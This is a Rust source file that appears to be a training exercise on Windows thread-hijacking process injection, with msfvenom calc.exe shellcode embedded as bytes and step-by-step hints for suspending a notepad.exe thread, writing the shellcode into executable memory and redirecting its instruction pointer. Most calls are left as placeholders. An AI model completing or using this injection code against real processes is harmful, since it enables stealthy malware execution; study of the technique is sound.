use std::ffi::c_void;
use std::mem;
use windows::Win32::Foundation::{CloseHandle, GetLastError, BOOL};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    CreateProcessA, OpenProcess, OpenThread, PROCESS_ALL_ACCESS, PROCESS_INFORMATION,
    ResumeThread, STARTUPINFOA, SuspendThread, THREAD_ALL_ACCESS,
};
use windows::core::PCSTR;

// x64 calc.exe shellcode (msfvenom -p windows/x64/exec CMD=calc.exe -f rust)
// Replace with freshly generated shellcode for actual testing on your VM.
const SHELLCODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x00,
];

fn main() {
    unsafe {
        // Step 1 — Spawn notepad.exe (NOT suspended — it will be running when we hijack it).
        // We use CreateProcessA here so we get pi.dwProcessId without needing to
        // enumerate processes. In a real scenario you'd enumerate with Toolhelp32 instead.
        //
        // Hint: CreateProcessA(
        //     lpapplicationname: PCSTR,   // b"notepad.exe\0"
        //     lpcommandline: PSTR,        // None
        //     lpprocessattributes, lpthreadattributes: Option<...>, // None, None
        //     binherithandles: BOOL,      // false
        //     dwcreationflags: PROCESS_CREATION_FLAGS,  // PROCESS_CREATION_FLAGS(0) — no flags
        //     lpenvironment: Option<*const c_void>,     // None
        //     lpcurrentdirectory: PCSTR,  // None
        //     lpstartupinfo: *const STARTUPINFOA, // &si
        //     lpprocessinformation: *mut PROCESS_INFORMATION, // &mut pi
        // ) -> Result<()>
        let mut si = STARTUPINFOA {
            cb: mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();
        todo!("CreateProcessA for notepad.exe (not suspended)");
        let target_pid = pi.dwProcessId;

        // Give notepad a moment to initialise before we suspend one of its threads.
        windows::Win32::System::Threading::Sleep(200);

        // Step 2 — Open a handle to the target process with full access.
        //
        // Hint: OpenProcess(
        //     dwdesiredaccess: PROCESS_ACCESS_RIGHTS, // PROCESS_ALL_ACCESS
        //     binherithandle: BOOL,                   // false
        //     dwprocessid: u32,                       // target_pid
        // ) -> Result<HANDLE>
        let h_process = todo!("OpenProcess(PROCESS_ALL_ACCESS, false, target_pid)");

        // Step 3 — Find a thread that belongs to the target process.
        // Take a snapshot of all threads on the system, then iterate until you find
        // one whose th32OwnerProcessID matches target_pid.
        //
        // Hint: CreateToolhelp32Snapshot(
        //     dwflags: CREATE_TOOLHELP_SNAPSHOT_FLAGS, // TH32CS_SNAPTHREAD
        //     th32processid: u32,                      // 0 — snapshot all threads system-wide
        // ) -> Result<HANDLE>
        //
        // Then:
        // Thread32First(hsnapshot: HANDLE, lpte: *mut THREADENTRY32) -> Result<()>
        // Thread32Next(hsnapshot: HANDLE, lpte: *mut THREADENTRY32) -> Result<()>
        //
        // THREADENTRY32 must have dwSize set before calling Thread32First:
        //   let mut te = THREADENTRY32 { dwSize: mem::size_of::<THREADENTRY32>() as u32, ..Default::default() };
        //
        // Loop until te.th32OwnerProcessID == target_pid, save te.th32ThreadID.
        let snap = todo!("CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)");
        let mut te = THREADENTRY32 {
            dwSize: mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };
        todo!("Thread32First(snap, &mut te)");
        let mut target_tid: u32 = 0;
        loop {
            if todo!("check te.th32OwnerProcessID == target_pid") {
                target_tid = todo!("te.th32ThreadID");
                break;
            }
            if todo!("Thread32Next(snap, &mut te)").is_err() {
                break;
            }
        }
        CloseHandle(snap).ok();
        assert_ne!(target_tid, 0, "no thread found in target process");

        // Step 4 — Open a handle to the target thread.
        //
        // Hint: OpenThread(
        //     dwdesiredaccess: THREAD_ACCESS_RIGHTS, // THREAD_ALL_ACCESS
        //     binherithandle: BOOL,                  // false
        //     dwthreadid: u32,                       // target_tid
        // ) -> Result<HANDLE>
        let h_thread = todo!("OpenThread(THREAD_ALL_ACCESS, false, target_tid)");

        // Step 5 — Suspend the thread so its register state is stable when we read it.
        // It is critical to suspend before calling GetThreadContext — reading context from
        // a running thread can produce garbage values.
        //
        // Hint: SuspendThread(
        //     hthread: HANDLE,  // h_thread
        // ) -> u32              // previous suspend count; 0xFFFFFFFF on failure
        let prev = todo!("SuspendThread(h_thread)");
        assert_ne!(prev, u32::MAX, "SuspendThread failed");

        // Step 6 — Allocate RWX memory in the target process and write shellcode.
        //
        // Hint: VirtualAllocEx(h_process, None, SHELLCODE.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        // Then: WriteProcessMemory(h_process, remote_buf, SHELLCODE.as_ptr() as _, SHELLCODE.len(), None)
        let remote_buf: *mut c_void = todo!("VirtualAllocEx for SHELLCODE.len() bytes");
        if remote_buf.is_null() {
            panic!("VirtualAllocEx failed: {:?}", GetLastError());
        }
        todo!("WriteProcessMemory: copy SHELLCODE into remote_buf");

        // Step 7 — Read the thread's current register context.
        // ContextFlags MUST be set before calling GetThreadContext.
        //
        // Hint: GetThreadContext(
        //     hthread: HANDLE,         // h_thread
        //     lpcontext: *mut CONTEXT, // &mut ctx (ContextFlags must be pre-set)
        // ) -> Result<()>
        let mut ctx = CONTEXT {
            ContextFlags: CONTEXT_FULL,
            ..Default::default()
        };
        todo!("GetThreadContext(h_thread, &mut ctx)");

        // Save the original RIP so you could restore it later (bonus).
        let original_rip = ctx.Rip;

        // Step 8 — Redirect RIP to the shellcode.
        // ctx.Rip is a direct u64 field on x64 CONTEXT.
        todo!("ctx.Rip = remote_buf as u64");

        // Step 9 — Apply the modified context to the thread.
        //
        // Hint: SetThreadContext(
        //     hthread: HANDLE,           // h_thread
        //     lpcontext: *const CONTEXT, // &ctx
        // ) -> Result<()>
        todo!("SetThreadContext(h_thread, &ctx)");

        // Step 10 — Resume the thread. It will execute the shellcode starting at RIP.
        //
        // Hint: ResumeThread(
        //     hthread: HANDLE,  // h_thread
        // ) -> u32              // previous count (1); 0xFFFFFFFF on failure
        todo!("ResumeThread(h_thread)");

        // Clean up handles.
        CloseHandle(h_thread).ok();
        CloseHandle(h_process).ok();
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();

        // Note: after the shellcode runs, ctx.Rip still points into the shellcode allocation.
        // If the shellcode returns (rather than exiting the process), the thread will crash
        // unless you restore the original RIP. See the "Context restoration" hint.
        let _ = original_rip;
    }
}
